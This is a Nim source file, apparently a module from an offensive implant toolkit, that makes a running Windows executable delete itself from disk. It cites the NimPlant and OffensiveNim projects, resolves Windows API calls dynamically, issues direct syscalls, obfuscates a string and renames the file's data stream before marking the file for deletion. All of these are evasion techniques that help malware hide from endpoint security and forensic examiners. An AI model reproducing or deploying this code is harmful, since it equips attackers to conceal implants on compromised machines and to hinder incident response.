#[
  - References:
      https://github.com/chvancooten/NimPlant/blob/main/client/util/selfDelete.nim
      https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/self_delete_bin.nim
]# 

import static_strs
import nimvoke/dinvoke
import nimvoke/syscalls
from winim/lean import HINSTANCE, DWORD, LPVOID, WCHAR, PWCHAR, LPWSTR, HANDLE, NULL, TRUE, WINBOOL, MAX_PATH,
                       HMODULE, LPSECURITY_ATTRIBUTES, NTSTATUS, LPCWSTR, BOOL, DELETE, OPEN_EXISTING, 
                       FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, INVALID_HANDLE_VALUE, FILE_INFO_BY_HANDLE_CLASS

type
  FILE_RENAME_INFO = object
    ReplaceIfExists*: WINBOOL
    RootDirectory*: HANDLE
    FileNameLength*: DWORD
    FileName*: array[8, WCHAR]
    
dinvokeDefine(
    SetFileInformationByHandle,
    "kernel32.dll",
    proc (hFile: HANDLE, 
          FileInformationClass: FILE_INFO_BY_HANDLE_CLASS,
          lpFileInformation: LPVOID,
          dwBufferSize: DWORD
    ): WINBOOL {.stdcall.}
)

dinvokeDefine(
    GetModuleFileNameW,
    "kernel32.dll",
    proc (hModule: HMODULE,
          lpFileName: LPWSTR, 
          nSize: DWORD
    ): DWORD {.stdcall.}
)

dinvokeDefine(
    CreateFileW, 
    "kernel32.dll",
    proc (lpFileName: LPCWSTR, 
          dwDesiredAccess: DWORD, 
          dwShareMode: DWORD, 
          lpSecurityAttributes: LPSECURITY_ATTRIBUTES,
          dwCreationDisposition: DWORD, 
          dwFlagsAndAttributes: DWORD, 
          hTemplateFile: HANDLE
    ): HANDLE {.stdcall.}
)

dinvokeDefine(
    PathFileExistsW,
    "shlwapi.dll",
    proc (pszPath: LPCWSTR): BOOL {.stdcall.}
)

proc openHdnl(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc renameHndl(hHandle: HANDLE): WINBOOL =
    let streamRename = newWideCString(jam(":msrpcsv"))

    var fRename: FILE_RENAME_INFO
    zeroMem(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = cast[LPWSTR](streamRename[0].unsafeaddr)
    fRename.FileNameLength = sizeof(lpwStream).DWORD;
    copyMem(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return SetFileInformationByHandle(hHandle, 3, addr fRename, sizeof(fRename) + sizeof(lpwStream)) 

proc depositeHndl(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    zeroMem(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE

    return SetFileInformationByHandle(hHandle, 4, addr fDelete, sizeof(fDelete).cint) 

proc sDelete*(): void =
    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE
        status: NTSTATUS

    zeroMem(addr wcPath[0], sizeof(wcPath));

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        quit(QuitFailure)

    hCurrent = openHdnl(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        quit(QuitFailure)

    if not renameHndl(hCurrent).bool:
        quit(QuitFailure)

    status = syscall(NtClose, hCurrent)

    hCurrent = openHdnl(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        quit(QuitFailure)

    if not depositeHndl(hCurrent).bool:
        quit(QuitFailure)

    status = syscall(NtClose, hCurrent)

